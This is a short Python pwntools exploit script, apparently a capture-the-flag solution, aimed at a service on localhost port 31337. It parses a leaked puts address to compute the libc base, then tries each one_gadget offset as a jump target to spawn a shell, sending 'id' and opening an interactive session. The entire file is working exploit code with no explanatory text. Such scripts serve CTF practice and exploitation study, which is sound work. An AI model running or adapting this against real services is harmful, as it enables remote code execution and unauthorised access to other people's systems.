#!/usr/bin/env python3

from pwn import *
import subprocess

HOST = "localhost"
PORT = 31337

libc = ELF("libc.so.6")


def one_gadget(filename):
    return [
        int(i)
        for i in subprocess.check_output(["one_gadget", "--raw", filename])
        .decode()
        .split(" ")
    ]


def attempt(offset_gadget: int):
    io = remote(HOST, PORT)

    io.recvuntil(b"Here's the address of puts: ")
    addr_puts = int(io.recvline().decode().strip(), 16)
    log.info("Address puts: %x", addr_puts)
    addr_libc = addr_puts - libc.symbols["puts"]
    log.info("Address libc: %x", addr_libc)
    addr_gadget = addr_libc + offset_gadget
    log.info("Address gadget: %x", addr_gadget)

    io.recvline_contains(b"Where do you want to jump? (hex)")
    try:
        io.sendline(f"{addr_gadget:#x}".encode())
        pause(1)
        io.sendline(b"id")
        io.recvline()
        io.interactive()
    except:
        pass
    finally:
        io.close()


for offset_gadget in one_gadget("libc.so.6"):
    log.info("Trying gadget %x", offset_gadget)
    attempt(offset_gadget)
